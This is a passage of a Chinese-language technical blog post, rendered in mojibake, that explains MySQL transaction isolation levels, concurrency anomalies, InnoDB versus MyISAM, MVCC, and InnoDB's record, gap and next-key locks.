<p>ç»¼ä¸Šï¼Œå¯ä»¥ç†è§£ä¸€è‡´æ€§å°±æ˜¯ï¼šåº”ç”¨ç³»ç»Ÿä»ä¸€ä¸ªæ­£ç¡®çš„çŠ¶æ€åˆ°å¦ä¸€ä¸ªæ­£ç¡®çš„çŠ¶æ€ã€‚è€ŒACIDå°±æ˜¯è¯´äº‹åŠ¡èƒ½å¤Ÿé€šè¿‡AIDæ¥ä¿è¯è¿™ä¸ªCçš„è¿‡ç¨‹ã€‚Cæ˜¯ç›®çš„ï¼ŒAIDéƒ½æ˜¯æ‰‹æ®µã€‚</p>
<h2 id="éš”ç¦»çº§åˆ«"><a href="#éš”ç¦»çº§åˆ«" class="headerlink" title="éš”ç¦»çº§åˆ«"></a>éš”ç¦»çº§åˆ«</h2><h3 id="å¹¶å‘å‡ºç°çš„é—®é¢˜"><a href="#å¹¶å‘å‡ºç°çš„é—®é¢˜" class="headerlink" title="å¹¶å‘å‡ºç°çš„é—®é¢˜"></a>å¹¶å‘å‡ºç°çš„é—®é¢˜</h3><ul>
<li>è„è¯»ï¼ˆdirty readï¼‰ï¼š Aäº‹åŠ¡è¿˜æ²¡æäº¤ï¼ŒBäº‹åŠ¡å°±è¯»åˆ°äº†Aäº‹åŠ¡çš„ç»“æœã€‚ï¼ˆç ´åäº†éš”ç¦»æ€§ï¼‰</li>
<li>ä¸¢å¤±ä¿®æ”¹ï¼ˆLost to modifyï¼‰ï¼šäº‹åŠ¡1è¯»å–æŸè¡¨ä¸­çš„æ•°æ® A &#x3D; 20ï¼Œäº‹åŠ¡2ä¹Ÿè¯»å– A &#x3D; 20ï¼Œäº‹åŠ¡1ä¿®æ”¹A &#x3D; A - 1ï¼Œäº‹åŠ¡2ä¹Ÿä¿®æ”¹ A &#x3D; A - 1ï¼Œæœ€ç»ˆç»“æœA&#x3D;19ï¼Œäº‹åŠ¡1çš„ä¿®æ”¹ä¸¢å¤±äº†ã€‚</li>
<li>ä¸å¯é‡å¤è¯»ï¼ˆUnrepeatablereadï¼‰ï¼š é’ˆå¯¹å…¶æäº¤å‰åï¼Œè¯»å–æ•°æ®æœ¬èº«çš„å¯¹æ¯”ã€‚Aäº‹åŠ¡åœ¨æœ¬æ¬¡äº‹ç‰©ä¸­ï¼Œå¯¹è‡ªå·±æœªæ“ä½œè¿‡çš„æ•°æ®ï¼Œè¿›è¡Œäº†å¤šæ¬¡è¯»å–ï¼Œç»“æœå‡ºç°äº†ä¸ä¸€è‡´æƒ…å†µã€‚(ç ´åäº†ä¸€è‡´æ€§ï¼Œupdate)</li>
<li>å¹»è¯»ï¼ˆPhantom readï¼‰ï¼šé’ˆå¯¹å…¶æäº¤å‰åï¼Œè¯»å–æ•°æ®æ¡æ•°çš„å¯¹æ¯”ã€‚åŒæ ·ä¸€ç¬”æŸ¥è¯¢åœ¨æ•´ä¸ªäº‹åŠ¡è¿‡ç¨‹ä¸­å¤šæ¬¡æ‰§è¡Œåï¼Œæ•°æ®æ€»é‡ä¸ä¸€è‡´ã€‚ Aäº‹åŠ¡åœ¨æœ¬æ¬¡äº‹åŠ¡ä¸­ï¼Œå¯¹è‡ªå·±æœªæ“ä½œè¿‡çš„æ•°æ®ï¼Œè¿›è¡Œäº†å¤šæ¬¡è¯»å–ï¼Œç¬¬ä¸€æ¬¡è¯»å–æ—¶ï¼Œæ•°æ®æ€»é‡100æ¡ï¼Œç¬¬äºŒæ¬¡è¯»å–æ—¶ï¼Œæ•°æ®æ€»é‡200æ¡ã€‚(ç ´åäº†ä¸€è‡´æ€§ï¼Œdelete)</li>
</ul>
<h3 id="è§£å†³æ–¹æ¡ˆ-åˆ¶å®šæ ‡å‡†"><a href="#è§£å†³æ–¹æ¡ˆ-åˆ¶å®šæ ‡å‡†" class="headerlink" title="è§£å†³æ–¹æ¡ˆ(åˆ¶å®šæ ‡å‡†)"></a>è§£å†³æ–¹æ¡ˆ(åˆ¶å®šæ ‡å‡†)</h3><p>è¯»å–æœªæäº¤ï¼ˆREAD-UNCOMMITTEDï¼‰ï¼šæœ€ä½çš„éš”ç¦»çº§åˆ«ï¼Œå…è®¸è¯»å–å°šæœªæäº¤çš„æ•°æ®å˜æ›´ï¼Œå¯èƒ½ä¼šå¯¼è‡´è„è¯»ã€å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»ã€‚</p>
<p>è¯»å–å·²æäº¤ï¼ˆREAD-COMMITTEDï¼‰ï¼šå…è®¸è¯»å–å¹¶å‘äº‹åŠ¡å·²ç»æäº¤çš„æ•°æ®ï¼Œå¯ä»¥é˜»æ­¢è„è¯»ï¼Œä½†æ˜¯å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿã€‚äº‹åŠ¡1åœ¨äº‹åŠ¡2æäº¤å‰è¯»å– A &#x3D; 20ï¼Œåœ¨äº‹åŠ¡2æäº¤åè¯»å– A &#x3D; 19ï¼Œä¸å¯é‡å¤è¯»ã€‚ å‡è®¾Aåˆšå¼€å§‹ä¸å­˜åœ¨ï¼Œäº‹åŠ¡1è¯»å–è®°å½•ä¸å­˜åœ¨ï¼Œäº‹åŠ¡2æäº¤åï¼Œäº‹åŠ¡1åˆè¯»å–åˆ°äº†Aï¼Œå¹»è¯»ã€‚</p>
<p>å¯é‡å¤è¯»ï¼ˆREPEATABLE-READï¼‰ï¼šå¯¹åŒä¸€å­—æ®µçš„å¤šæ¬¡è¯»å–ç»“æœéƒ½æ˜¯ä¸€è‡´çš„ï¼Œé™¤éæ•°æ®æ˜¯è¢«æœ¬èº«äº‹åŠ¡è‡ªå·±æ‰€ä¿®æ”¹ï¼Œå¯ä»¥é˜»æ­¢è„è¯»å’Œä¸å¯é‡å¤è¯»ï¼Œä½†å¹»è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿã€‚å‡è®¾ A åˆšå¼€å§‹ä¸å­˜åœ¨ï¼Œäº‹åŠ¡1è¯»å–è®°å½•ä¸å­˜åœ¨ï¼Œäº‹åŠ¡2å°†Aæ’å…¥ç„¶åæäº¤ï¼Œäº‹åŠ¡1åˆè¯»å–åˆ°Aï¼Œå¹»è¯»ã€‚</p>
<p>å¯ä¸²è¡ŒåŒ–ï¼ˆSERIALIZABLEï¼‰ï¼šæœ€é«˜çš„éš”ç¦»çº§åˆ«ï¼Œå®Œå…¨æœä»ACIDçš„éš”ç¦»çº§åˆ«ã€‚æ‰€æœ‰çš„äº‹åŠ¡ä¾æ¬¡é€ä¸ªæ‰§è¡Œï¼Œè¿™æ ·äº‹åŠ¡ä¹‹é—´å°±å®Œå…¨ä¸å¯èƒ½äº§ç”Ÿå¹²æ‰°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥çº§åˆ«å¯ä»¥é˜²æ­¢è„è¯»ã€ä¸å¯é‡å¤è¯»ä»¥åŠå¹»è¯»ã€‚</p>
<table>
<thead>
<tr>
<th>éš”ç¦»çº§åˆ«</th>
<th>è„è¯»</th>
<th>ä¸å¯é‡å¤è¯»</th>
<th>å¹»è¯»</th>
</tr>
</thead>
<tbody><tr>
<td>READ-UNCOMMITTED</td>
<td>âˆš</td>
<td>âˆš</td>
<td>âˆš</td>
</tr>
<tr>
<td>READ-COMMITTED</td>
<td>Ã—</td>
<td>âˆš</td>
<td>âˆš</td>
</tr>
<tr>
<td>REPEATABLE-READ</td>
<td>Ã—</td>
<td>Ã—</td>
<td>âˆš</td>
</tr>
<tr>
<td>SERIALIZABLE</td>
<td>Ã—</td>
<td>Ã—</td>
<td>Ã—</td>
</tr>
</tbody></table>
<h3 id="å®ç°-Innodb"><a href="#å®ç°-Innodb" class="headerlink" title="å®ç°(Innodb)"></a>å®ç°(Innodb)</h3><ul>
<li><p>é”æœºåˆ¶ï¼šé˜»æ­¢å…¶ä»–äº‹åŠ¡å¯¹æ•°æ®è¿›è¡Œæ“ä½œï¼Œå„ä¸ªéš”ç¦»çº§åˆ«ä¸»è¦ä½“ç°åœ¨è¯»å–æ•°æ®æ—¶åŠ çš„é”å’Œé‡Šæ”¾æ—¶æœºã€‚</p>
<ul>
<li>RUï¼šäº‹åŠ¡è¯»å–çš„æ—¶å€™ï¼Œä¸åŠ é”ã€‚</li>
<li>RCï¼šäº‹åŠ¡è¯»å–çš„æ—¶å€™åŠ è¡Œçº§å…±äº«é”ï¼ˆè¯»åˆ°æ‰åŠ é”ï¼ŒåŠ é”åå¿…é¡»ç­‰å…¶ä»–äº‹åŠ¡æäº¤åæ‰ä¼šæ‰§è¡Œï¼‰ï¼Œ ä¸€æ—¦è¯»å®Œï¼Œç«‹åˆ»é‡Šæ”¾ï¼ˆå¹¶ä¸æ˜¯äº‹åŠ¡ç»“æŸï¼‰ã€‚</li>
<li>RRï¼šäº‹åŠ¡è¯»å–æ—¶åŠ è¡Œçº§å…±äº«é”ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸæ‰é‡Šæ”¾ã€‚</li>
<li>SEï¼šäº‹åŠ¡è¯»å–æ—¶åŠ è¡¨çº§å…±äº«é”ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸæ—¶æ‰ä¼šé‡Šæ”¾ã€‚</li>
</ul>
</li>
<li><p>å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMultiversion Concurrency Controlï¼ŒMVCCï¼‰æœºåˆ¶ï¼ˆInnodbé»˜è®¤å¼€å¯ï¼‰ï¼šç”Ÿæˆä¸€ä¸ªæ•°æ®å¿«ç…§ï¼Œå¹¶ç”¨è¿™ä¸ªå¿«ç…§æ¥æä¾›ä¸€å®šçº§åˆ«çš„ä¸€è‡´æ€§çš„è¯»å–ï¼Œä¹Ÿç§°ä¸ºå¤šç‰ˆæœ¬æ•°æ®æ§åˆ¶ã€‚</p>
<ul>
<li>å®é™…ä¸Šå°±æ˜¯CASç‰ˆæœ¬æ§åˆ¶å’Œè¯»å†™åˆ†ç¦»çš„æ€æƒ³</li>
<li>ä¸»è¦ä½œç”¨äºRCå’ŒRRçº§åˆ«</li>
</ul>
</li>
</ul>
<h2 id="MyISAMå’ŒInnoDB"><a href="#MyISAMå’ŒInnoDB" class="headerlink" title="MyISAMå’ŒInnoDB"></a>MyISAMå’ŒInnoDB</h2><p>å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–è¯»é”ï¼ŒåŒæ—¶å¦å¤–ä¸€ä¸ªè¿›ç¨‹æƒ³è¦è·å–å†™é”ã€‚åœ¨MySQLä¸­ï¼Œå†™é”æ˜¯ä¼˜å…ˆäºè¯»é”çš„ã€‚å†™é”å’Œè¯»é”ä¼˜å…ˆçº§çš„é—®é¢˜æ˜¯å¯ä»¥é€šè¿‡å‚æ•°è°ƒèŠ‚çš„ï¼šmax_write_lock_countå’Œlow-priority-updatesã€‚</p>
<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><ul>
<li>MYISAMè¡¨çº§é”</li>
<li>ä¸æ”¯æŒäº‹åŠ¡</li>
<li>ä¸æ”¯æŒå¤–é”®</li>
<li>ä¸æ”¯æŒæ•°æ®åº“å¼‚å¸¸å´©æºƒåçš„å®‰å…¨æ¢å¤</li>
<li>ä¸æ”¯æŒMVCC</li>
</ul>
<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><ul>
<li><p>InnoDBåªæœ‰é€šè¿‡ç´¢å¼•æ¡ä»¶æ£€ç´¢æ•°æ®æ‰ä½¿ç”¨è¡Œçº§é”ï¼Œå¦åˆ™ï¼ŒInnoDBä½¿ç”¨è¡¨é”ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒInnoDBçš„è¡Œé”æ˜¯åŸºäºç´¢å¼•çš„ã€‚</p>
</li>
<li><p>Innodbæ”¯æŒè¡Œé”å’Œè¡¨é”ï¼Œé»˜è®¤ä¸ºè¡Œçº§é”ã€‚ </p>
</li>
<li><p>æ”¯æŒäº‹åŠ¡ï¼Œå¹¶ä¸”å…·æœ‰æäº¤ï¼ˆcommitï¼‰å’Œå›æ»šï¼ˆrollbackï¼‰äº‹åŠ¡çš„èƒ½åŠ›ã€‚</p>
</li>
<li><p>æ”¯æŒå¤–é”®ï¼ˆä¸å»ºè®®ä½¿ç”¨ï¼‰ã€‚</p>
</li>
<li><p>æ”¯æŒæ•°æ®åº“å¼‚å¸¸å´©æºƒåçš„å®‰å…¨æ¢å¤ï¼Œå‘ç”Ÿå¼‚å¸¸å´©æºƒåï¼Œæ•°æ®åº“é‡æ–°å¯åŠ¨çš„æ—¶å€™ä¼šä¿è¯æ•°æ®åº“æ¢å¤åˆ°å´©æºƒå‰çš„çŠ¶æ€ï¼Œè¿™ä¸ªæ¢å¤ä¾èµ–äºredo logã€‚</p>
</li>
<li><p>æ”¯æŒMVCCï¼ŒMVCCå¯ä»¥çœ‹ä½œæ˜¯è¡Œçº§é”çš„ä¸€ä¸ªå‡çº§ï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘åŠ é”æ“ä½œï¼Œæå‡æ€§èƒ½ã€‚</p>
</li>
<li><p>åœ¨åˆ†å¸ƒå¼äº‹åŠ¡çš„æƒ…å†µä¸‹ä¸€èˆ¬ä¼šç”¨åˆ°SERIALIZABLEï¼ˆå¯ä¸²æ€§åŒ–ï¼‰éš”ç¦»çº§åˆ«ã€‚</p>
</li>
<li><p>MySQL InnoDBå¼•æ“ä½¿ç”¨redo logä¿è¯äº‹åŠ¡çš„æŒä¹…æ€§ï¼Œä½¿ç”¨undo logæ¥ä¿è¯äº‹åŠ¡çš„åŸå­æ€§ã€‚</p>
</li>
<li><p>MySQL InnoDBå¼•æ“é€šè¿‡é”æœºåˆ¶ã€MVCCç­‰æ‰‹æ®µæ¥ä¿è¯äº‹åŠ¡çš„éš”ç¦»æ€§ï¼ˆé»˜è®¤çš„éš”ç¦»çº§åˆ«æ˜¯REPEARTABLE-READï¼‰ã€‚</p>
</li>
</ul>
<h3 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a><a href="https://blog.csdn.net/whoamiyang/article/details/51901888?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&dist_request_id=1331645.10885.16183849906828127&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">MVCC</a></h3><p>è¯»ä¸åŠ é”ï¼Œè¯»å†™ä¸å†²çªã€‚å¤§å¤šæ•°æƒ…å†µä¸‹å¯ä»¥ä»£æ›¿è¡Œçº§é”ã€‚</p>
<p>MVCCæ˜¯é€šè¿‡åœ¨æ¯è¡Œè®°å½•åé¢ä¿å­˜ä¸¤ä¸ªéšè—çš„åˆ—æ¥å®ç°ã€‚è¿™ä¸¤ä¸ªåˆ—ï¼Œä¸€ä¸ªä¿å­˜äº†è¡Œçš„åˆ›å»ºæ—¶é—´ï¼Œä¸€ä¸ªä¿å­˜è¡Œçš„è¿‡æœŸæ—¶é—´ï¼ˆæˆ–åˆ é™¤æ—¶é—´ï¼‰ã€‚ å½“ç„¶å­˜å‚¨çš„å¹¶ä¸æ˜¯å®é™…çš„æ—¶é—´å€¼ï¼Œè€Œæ˜¯ç³»ç»Ÿç‰ˆæœ¬å·ã€‚æ¯å¼€å§‹ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œç³»ç»Ÿç‰ˆæœ¬å·éƒ½ä¼šè‡ªåŠ¨é€’å¢ã€‚äº‹åŠ¡å¼€å§‹æ—¶åˆ»çš„ç³»ç»Ÿç‰ˆæœ¬å·ä¼šä½œä¸ºäº‹åŠ¡çš„ç‰ˆæœ¬å·ï¼Œç”¨æ¥å’ŒæŸ¥è¯¢åˆ°çš„æ¯è¡Œè®°å½•çš„ç‰ˆæœ¬å·è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>åœ¨REPEATABLE READéš”ç¦»çº§åˆ«ä¸‹ï¼ŒMVCCå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p>
<ol>
<li>SELECT</li>
</ol>
<p>InnoDBä¼šæ ¹æ®ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶æ£€æŸ¥æ¯è¡Œè®°å½•ï¼š</p>
<ul>
<li><p>InnoDBåªä¼šæŸ¥æ‰¾ç‰ˆæœ¬æ—©äºå½“å‰äº‹åŠ¡ç‰ˆæœ¬çš„æ•°æ®è¡Œï¼ˆä¹Ÿå°±æ˜¯ï¼Œè¡Œçš„ç³»ç»Ÿç‰ˆæœ¬å·å°äºæˆ–ç­‰äºäº‹åŠ¡çš„ç³»ç»Ÿç‰ˆæœ¬å·ï¼‰ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿äº‹åŠ¡è¯»å–çš„è¡Œè¦ä¹ˆæ˜¯åœ¨äº‹åŠ¡å¼€å§‹å‰å·²ç»å­˜åœ¨çš„ï¼Œè¦ä¹ˆæ˜¯äº‹åŠ¡è‡ªèº«æ’å…¥æˆ–è€…ä¿®æ”¹è¿‡çš„ã€‚</p>
</li>
<li><p>è¡Œçš„åˆ é™¤ç‰ˆæœ¬å·è¦ä¹ˆæœªå®šä¹‰ï¼Œè¦ä¹ˆå¤§äºå½“å‰äº‹åŠ¡ç‰ˆæœ¬å·ï¼Œè¿™å¯ä»¥ç¡®ä¿äº‹åŠ¡è¯»å–åˆ°çš„è¡Œï¼Œåœ¨äº‹åŠ¡å¼€å§‹ä¹‹å‰æœªè¢«åˆ é™¤ã€‚</p>
</li>
</ul>
<p>åªæœ‰åŒæ—¶æ»¡è¶³çš„è®°å½•ï¼Œæ‰èƒ½è¿”å›ä½œä¸ºæŸ¥è¯¢ç»“æœã€‚</p>
<p>MVCCå¯ä»¥è§£å†³è¿™ç§åœºæ™¯çš„å¹»è¯»é—®é¢˜ï¼Œä¾‹å¦‚äº‹åŠ¡1çš„äº‹åŠ¡ç‰ˆæœ¬å·Ã±ä¸º1ï¼Œ äº‹åŠ¡2çš„äº‹åŠ¡ç‰ˆæœ¬å·ä¸º2ã€‚äº‹åŠ¡2ç¬¬ä¸€æ¬¡æŸ¥è¯¢æ˜¯æœ‰100æ¡è®°å½•ï¼Œ ç„¶åäº‹åŠ¡1æ·»åŠ äº†100æ¡æ•°æ®ï¼Œè¿™äº›æ•°æ®çš„ç‰ˆæœ¬å·æ˜¯å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ï¼ˆå‡è®¾ä¸º3ï¼‰ï¼Œæ­¤æ—¶äº‹åŠ¡2å†å»æŸ¥è¯¢çš„è¯ä¹Ÿåªèƒ½æŸ¥è¯¢å‡º100æ¡æ•°æ®ï¼Œå› ä¸ºå½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ï¼ˆ3ï¼‰å¤§äºäº‹åŠ¡2çš„äº‹åŠ¡ç‰ˆæœ¬å·ï¼ˆ2ï¼‰ã€‚</p>
<ol start="2">
<li>INSERT</li>
</ol>
<p>InnoDBä¸ºæ–°æ’å…¥çš„æ¯ä¸€è¡Œä¿å­˜å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ï¼ˆæ³¨æ„ä¸æ˜¯äº‹åŠ¡ç‰ˆæœ¬å·ï¼‰ä½œä¸ºç‰ˆæœ¬å·ã€‚</p>
<ol start="3">
<li>DELETE</li>
</ol>
<p>InnoDBä¼šä¸ºåˆ é™¤çš„æ¯ä¸€è¡Œä¿å­˜å½“å‰ç³»ç»Ÿçš„ç‰ˆæœ¬å·ï¼ˆæ³¨æ„ä¸æ˜¯äº‹åŠ¡ç‰ˆæœ¬å·ï¼‰ä½œä¸ºåˆ é™¤æ ‡è¯†.</p>
<ol start="4">
<li>UPDATE</li>
</ol>
<p>InnoDBæ‰§è¡ŒUPDATEï¼Œå®é™…ä¸Šæ˜¯æ–°æ’å…¥äº†ä¸€è¡Œè®°å½•ï¼Œå¹¶ä¿å­˜å…¶åˆ›å»ºæ—¶é—´ä¸ºå½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ï¼ˆæ³¨æ„ä¸æ˜¯äº‹åŠ¡ç‰ˆæœ¬å·ï¼‰ï¼ŒåŒæ—¶ä¿å­˜å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·åˆ°è¦UPDATEçš„è¡Œçš„åˆ é™¤æ—¶é—´ã€‚</p>
<h3 id="InnoDB-å­˜å‚¨å¼•æ“ä¸­è¡Œé”çš„ä¸‰ç§ç®—æ³•"><a href="#InnoDB-å­˜å‚¨å¼•æ“ä¸­è¡Œé”çš„ä¸‰ç§ç®—æ³•" class="headerlink" title="InnoDB å­˜å‚¨å¼•æ“ä¸­è¡Œé”çš„ä¸‰ç§ç®—æ³•"></a>InnoDB å­˜å‚¨å¼•æ“ä¸­è¡Œé”çš„ä¸‰ç§ç®—æ³•</h3><h4 id="è®°å½•é”ï¼ˆRecord-lockï¼‰"><a href="#è®°å½•é”ï¼ˆRecord-lockï¼‰" class="headerlink" title="è®°å½•é”ï¼ˆRecord lockï¼‰"></a>è®°å½•é”ï¼ˆRecord lockï¼‰</h4><p>è®°å½•é”å°±æ˜¯ä¸ºæŸè¡Œè®°å½•åŠ é”ï¼ŒåŸºäºå”¯ä¸€ç´¢å¼•ï¼Œäº‹å®ä¸Šï¼Œå®ƒå°é”çš„æ˜¯è¯¥è¡Œçš„ç´¢å¼•è®°å½•ã€‚å¦‚æœè¡¨åœ¨å»ºç«‹çš„æ—¶å€™æ²¡æœ‰è®¾ç½®ä»»ä½•ä¸€ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆ InnoDB å­˜å‚¨å¼•æ“ä¼šä½¿ç”¨ â€œéšå¼çš„ä¸»é”®â€ æ¥è¿›è¡Œé”å®šã€‚</p>
<p>éšå¼çš„ä¸»é”®å°±æ˜¯æŒ‡ï¼šå¦‚æœåœ¨å»ºè¡¨çš„æ—¶å€™æ²¡æœ‰æŒ‡å®šä¸»é”®ï¼ŒInnoDB å­˜å‚¨å¼•æ“ä¼šå°†ç¬¬ä¸€åˆ—éç©ºçš„åˆ—ä½œä¸ºä¸»é”®ï¼›å¦‚æœæ²¡æœ‰çš„è¯ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€åˆ—ä¸º 6 å­—èŠ‚çš„ä¸»é”®ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬çš„ SQL è¯­å¥ä¸­çš„æ¡ä»¶å¯¼è‡´ç´¢å¼•å¤±æ•ˆï¼ˆæ¯”å¦‚ä½¿ç”¨ orï¼‰ æˆ–è€…è¯´æ¡ä»¶æ ¹æœ¬å°±ä¸æ¶‰åŠç´¢å¼•æˆ–è€…ä¸»é”®ï¼Œè¡Œçº§é”å°±å°†é€€åŒ–ä¸ºè¡¨é”ã€‚</p>
<h5 id="ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ï¼Œä¼šå‘ç”Ÿé”å†²çªå—ï¼Ÿ"><a href="#ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ï¼Œä¼šå‘ç”Ÿé”å†²çªå—ï¼Ÿ" class="headerlink" title="ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ï¼Œä¼šå‘ç”Ÿé”å†²çªå—ï¼Ÿ"></a>ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ï¼Œä¼šå‘ç”Ÿé”å†²çªå—ï¼Ÿ</h5><p>è¡Œé”é”ä½çš„æ˜¯ç´¢å¼•ï¼Œè€Œä¸æ˜¯ä¸€æ¡è®°å½•ï¼ˆåªä¸è¿‡æˆ‘ä»¬å¹³å¸¸è¿™ä¹ˆè¯´é”ä½äº†å“ªæ¡è®°å½•ï¼Œæ¯”è¾ƒå¥½ç†è§£ç½¢äº†ï¼‰ã€‚æ‰€ä»¥å¦‚æœä¸¤ä¸ªäº‹åŠ¡åˆ†åˆ«æ“ä½œçš„ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ï¼ŒæŸä¸ªäº‹åŠ¡ä¼šå› ä¸ºè¡Œé”è¢«å¦ä¸€ä¸ªäº‹åŠ¡å ç”¨è€Œå‘ç”Ÿç­‰å¾…ã€‚ä¾‹å¦‚ä¸¤æ¡è®°å½•é‡Œå¹´é¾„å­—æ®µéƒ½ä¸º20ï¼Œå¹´é¾„å­—æ®µæœ‰ç´¢å¼•ã€‚</p>
<h4 id="é—´éš™é”ï¼ˆGap-Lockï¼‰"><a href="#é—´éš™é”ï¼ˆGap-Lockï¼‰" class="headerlink" title="é—´éš™é”ï¼ˆGap Lockï¼‰"></a>é—´éš™é”ï¼ˆGap Lockï¼‰</h4><p>åŸºäºéå”¯ä¸€ç´¢å¼•ï¼Œé”å®šä¸€ä¸ªèŒƒå›´ï¼Œä¸åŒ…æ‹¬è®°å½•æœ¬èº«ã€‚ åœ¨å¯é‡å¤è¯»æäº¤ä¸‹ä¸ºäº†è§£å†³å¹»è¯»é—®é¢˜æ—¶å¼•å…¥çš„é”æœºåˆ¶ã€‚ </p>
<p>Gap Lock å’Œ Next-Key Lock é”å®šçš„éƒ½æ˜¯ä¸€æ®µèŒƒå›´å†…çš„ç´¢å¼•è®°å½•ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">10</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¸Šè¿° SQL è¯­å¥ï¼Œæ‰€æœ‰åœ¨ï¼ˆ1ï¼Œ10ï¼‰åŒºé—´å†…ï¼ˆå·¦å¼€å³å¼€ï¼‰çš„è®°å½•è¡Œéƒ½ä¼šè¢« Gap Lock é”ä½ï¼Œæ‰€æœ‰ id ä¸º 2ã€3ã€4ã€5ã€6ã€7ã€8ã€9 çš„æ•°æ®è¡Œçš„æ’å…¥ä¼šè¢«é˜»å¡ï¼Œä½†æ˜¯ 1 å’Œ 10 ä¸¤æ¡è¢«æ“ä½œçš„ç´¢å¼•è®°å½•å¹¶ä¸ä¼šè¢«é”ä½ã€‚</p>
<h4 id="ä¸´é”®é”ï¼ˆNext-key-lockï¼‰"><a href="#ä¸´é”®é”ï¼ˆNext-key-lockï¼‰" class="headerlink" title="ä¸´é”®é”ï¼ˆNext-key lockï¼‰"></a>ä¸´é”®é”ï¼ˆNext-key lockï¼‰</h4><p>åŸºäºéå”¯ä¸€ç´¢å¼•ï¼Œè¡Œé”å’Œé—´éš™é”çš„ç»„åˆï¼Œé”å®šä¸€ä¸ªèŒƒå›´ï¼ŒåŒ…å«è®°å½•æœ¬èº«ã€‚ å¯¹äºè¡ŒæŸ¥è¯¢ï¼Œéƒ½æ˜¯é‡‡ç”¨è¯¥æ–¹æ³•ï¼Œä¸»è¦ç›®çš„æ˜¯ä¸ºäº†è§£å†³å¹»è¯»é—®é¢˜ã€‚</p>
<p>ä¾‹å¦‚ä¸€ä¸ªç´¢å¼•æœ‰ 10ï¼Œ11ï¼Œ13 å’Œ 20 è¿™å››ä¸ªå€¼ï¼Œåˆ†åˆ«å¯¹è¿™ä¸ª 4 ä¸ªç´¢å¼•è¿›è¡ŒåŠ é”æ“ä½œï¼Œé‚£ä¹ˆè¿™å››ä¸ªæ“ä½œåˆ†åˆ«å¯¹åº”çš„ Next-Key Lock é”ä½çš„åŒºé—´æ˜¯ï¼š</p>
<ul>
<li>(-âˆ, 10]</li>
<li>(10, 11]</li>
<li>(11, 13]</li>
<li>(13, 20]</li>
<li>(20, +âˆ]</li>
</ul>
<p>å’Œ Gap Lock çš„ä¸åŒä¹‹å¤„å°±åœ¨äºï¼ŒNext-Key Lock é”å®šçš„åŒºé—´æ˜¯å·¦å¼€å³é—­çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯åŒ…å«å½“å‰è¢«æ“ä½œçš„ç´¢å¼•è®°å½•çš„ã€‚</p>
<p>åœ¨ InnoDB é»˜è®¤çš„éš”ç¦»çº§åˆ« REPEATABLE-READ ä¸‹ï¼Œè¡Œé”é»˜è®¤ä½¿ç”¨çš„ç®—æ³•å°±æ˜¯ Next-Key Lockã€‚ä½†æ˜¯ï¼Œå¦‚æœæ“ä½œçš„ç´¢å¼•æ˜¯å”¯ä¸€ç´¢å¼•æˆ–ä¸»é”®ï¼ŒInnoDB ä¼šå¯¹ Next-Key Lock è¿›è¡Œä¼˜åŒ–ï¼Œå°†å…¶é™çº§ä¸º Record Lockï¼Œå³ä»…é”ä½ç´¢å¼•æœ¬èº«ï¼Œè€Œä¸æ˜¯èŒƒå›´ã€‚</p>
<p>ç”±äºä¸»é”®ä¹Ÿæ˜¯ä¸€ç§å”¯ä¸€ç´¢å¼•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆè¯´ï¼šRecord Lock æ˜¯åŸºäºå”¯ä¸€ç´¢å¼•çš„ï¼Œè€Œ Next-Key Lock æ˜¯åŸºäºéå”¯ä¸€ç´¢å¼•çš„ã€‚</p>
